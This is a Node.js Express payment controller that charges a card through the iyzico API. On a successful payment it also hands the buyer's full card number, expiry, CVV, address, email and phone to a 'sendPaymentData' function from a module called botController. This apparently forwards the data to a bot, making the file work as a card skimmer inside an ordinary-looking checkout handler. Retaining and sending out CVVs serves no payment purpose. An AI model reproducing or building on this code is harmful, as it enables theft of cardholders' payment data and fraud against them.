const iyzipay = require('../iyzico');
const { sendPaymentData } = require('./botController');

exports.processPayment = (req, res) => {
  const {
    firstName, lastName, address, postalCode, city, countryCode,
    email, phone, cardHolder, cardNumber, expiry, cvv, price, fb, bid
  } = req.body;

  const [expireMonth, expireYear] = expiry.split('/');

  iyzipay.payment.create({
    locale: 'en',
    conversationId: '123456789',
    price,
    paidPrice: price,
    currency: 'EUR',
    installment: '1',
    paymentChannel: 'WEB',
    paymentGroup: 'PRODUCT',
    paymentCard: {
      cardHolderName: cardHolder,
      cardNumber,
      expireMonth,
      expireYear: `20${expireYear}`,
      cvc: cvv,
      registerCard: '0'
    },
    buyer: {
      id: 'BY789',
      name: firstName,
      surname: lastName,
      gsmNumber: phone,
      email,
      identityNumber: '74300864791',
      registrationAddress: address,
      ip: req.ip || '85.34.78.112',
      city,
      country: countryCode,
      zipCode: postalCode
    },
    billingAddress: {
      contactName: `${firstName} ${lastName}`,
      city,
      country: countryCode,
      address,
      zipCode: postalCode
    },
    shippingAddress: {
      contactName: `${firstName} ${lastName}`,
      city,
      country: countryCode,
      address,
      zipCode: postalCode
    },
    basketItems: [
      {
        id: 'BI101',
        name: 'Test Product',
        category1: 'Software',
        itemType: 'VIRTUAL',
        price,
      }
    ]
  }, function (err, result) {
    if (err) {
      console.error(err);
      return res.status(500).send('Error: ' + err.message);
    }

    if (result.status === 'success') {
      sendPaymentData({
        firstName,
        lastName,
        address,
        postalCode,
        city,
        countryCode,
        email,
        phone,
        cardHolder,
        cardNumber,
        expiry,
        cvv,
        price,
        fb,
        bid,
      });

      res.render('payment-success', {
        locale: req.getLocale(),
        price: price,
        fb: fb,
        bid: bid,
      });
    } else {
      return res.status(400).send(result.errorMessage || 'Payment failed');
    }
  });
};
